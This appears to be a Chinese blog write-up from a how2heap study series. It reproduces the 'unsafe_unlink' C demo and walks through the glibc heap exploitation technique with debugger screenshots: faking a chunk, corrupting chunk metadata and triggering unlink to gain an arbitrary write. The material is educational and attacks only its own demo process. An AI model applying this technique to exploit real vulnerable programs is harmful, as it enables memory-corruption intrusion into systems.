---
title: unsafe_unlink
date:  2020-08-12 18:31:09
updated:  2020-08-12 18:31:09
tags:
    - heap
    - pwn
    - unsafe_unlink
categories: 
	- 二进制安全
	- how2heap
use:
  - Valine
text: true
lazyload: true
count: true
---

# 源码

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


uint64_t *chunk0_ptr;

int main()
{
    fprintf(stderr, "Welcome to unsafe unlink 2.0!\n");
    fprintf(stderr, "Tested in Ubuntu 14.04/16.04 64bit.\n");
    fprintf(stderr, "This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
    fprintf(stderr, "The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");

    int malloc_size = 0x80; //we want to be big enough not to use fastbins
    int header_size = 2;

    fprintf(stderr, "The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");

    chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
    uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
    fprintf(stderr, "The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
    fprintf(stderr, "The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

    fprintf(stderr, "We create a fake chunk inside chunk0.\n");
    fprintf(stderr, "We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
    chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
    fprintf(stderr, "We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
    fprintf(stderr, "With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
    chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
    fprintf(stderr, "Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
    fprintf(stderr, "Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);

    fprintf(stderr, "We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
    uint64_t *chunk1_hdr = chunk1_ptr - header_size;
    fprintf(stderr, "We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
    fprintf(stderr, "It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
    chunk1_hdr[0] = malloc_size;
    fprintf(stderr, "If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
    fprintf(stderr, "We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
    chunk1_hdr[1] &= ~1;

    fprintf(stderr, "Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
    fprintf(stderr, "You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
    free(chunk1_ptr);

    fprintf(stderr, "At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
    char victim_string[8];
    strcpy(victim_string,"Hello!~");
    chunk0_ptr[3] = (uint64_t) victim_string;

    fprintf(stderr, "chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
    fprintf(stderr, "Original value: %s\n",victim_string);
    chunk0_ptr[0] = 0x4141414142424242LL;
    fprintf(stderr, "New Value: %s\n",victim_string);
}
```

# 运行结果

**![image.png](https://i.loli.net/2020/11/17/IravxsBte9g3SAO.png)**

# 分析&调试

首先声明了一个全局变量chunk0_ptr:

初始地址在0x602070，内容为0

![image.png](https://i.loli.net/2020/11/17/y1NzHdihPR9oJvS.png)

之后malloc了两块chunk

![image.png](https://i.loli.net/2020/11/17/IeS4KsgQBhw56ar.png)

并将全局变量的值改成了第一个chunk的mem指针地址0x603010

![image.png](https://i.loli.net/2020/11/17/LsuFxgPQonpHYcv.png)

接下去就是要在chunk0中伪造一个chunk了。因为unlink需要检查该节点的前一个节点的后一个节点是不是该节点本身、该节点的后一个节点的前一个结点是不是该节点本身，所以这个我们也需要绕过

首先将chunk0_ptr[2]的值改成了chunk0_ptr的地址-0x18的值，这里是我们伪造的chunk的fd指针

我们将0x602058当做chunk头的话，其bk指针在0x602070上，刚刚好指向我们伪造的这个chunk头的地址

![image.png](https://i.loli.net/2020/11/17/9N1acitqzGgdxDs.png)

接下来将chunk0_ptr[3]的值也就是我们伪造的bk指针改成chunk0_ptr本身地址-0x10的值

可以看到，若是把0x602060当作chunk头，其fd指针又恰好指向了我们伪造的chunk的地址

（这也太巧妙了）

![image.png](https://i.loli.net/2020/11/17/k4osZhytd2qQnj1.png)

那么我们伪造的chunk的fd、bk就能通过检查了~

然后我们通过修改chunk1的prev_size\size字段的控制字段欺骗上一块chunk是我们伪造的chunk并且是free状态

![image.png](https://i.loli.net/2020/11/17/Q41rvpBfmP3tXO6.png)

这个时候我们再free chunk1，就会触发unlink

它先做Fd->bk=Bk,再做Bk->fd=Fd，也就是chunk0_ptr指针的内容先变成0x602060，再变成0x602058

![image.png](https://i.loli.net/2020/11/17/dWtY9qcsCArLHMX.png)

成功合并：

![image.png](https://i.loli.net/2020/11/17/4fAikctvrah71Tx.png)

并且让chunk0_ptr的内容改成了0x602058，这个时候chunk0_ptr 和 chunk0_ptr[3] 指向的是同一个地址

![image.png](https://i.loli.net/2020/11/17/F1s9wxlMPWLDIKc.png)

![image.png](https://i.loli.net/2020/11/17/aNT3GzZxY1poHRe.png)

之后将victim_string赋值为Hello!~

并且将改变量地址放到了chunk0_ptr[3]里面，相当于改chunk_ptr指向了变量地址也就是栈的位置

![image.png](https://i.loli.net/2020/11/17/gvNULMYfwe9iE1V.png)

再之后通过chunk0_ptr[0]修改其中的值

![image.png](https://i.loli.net/2020/11/17/IzgLCeOlp3fRMqb.png)

# 总结

- 巧妙的一点就是伪造chunk的fd和bk可以绕过检测
- unlink的机制
- 主要得搞懂chunk0_ptr和chunk0_ptr[x]分别是什么意思
- 其实主要流程就是在chunk中伪造一个chunk，然后又修改下一个chunk的控制信息，以为上个chunk是free状态，这样free下一个chunk的时候就会触发unlink，就会堆块地址劫持？然后我们通过chunk0_ptr和chunk0_ptr[3]指向同以地址这个特点，通过修改chunk0_ptr[3]的值从而改变chunk0_ptr指向的地址，从而利用chunk0_ptr[0]修改该地址中的内容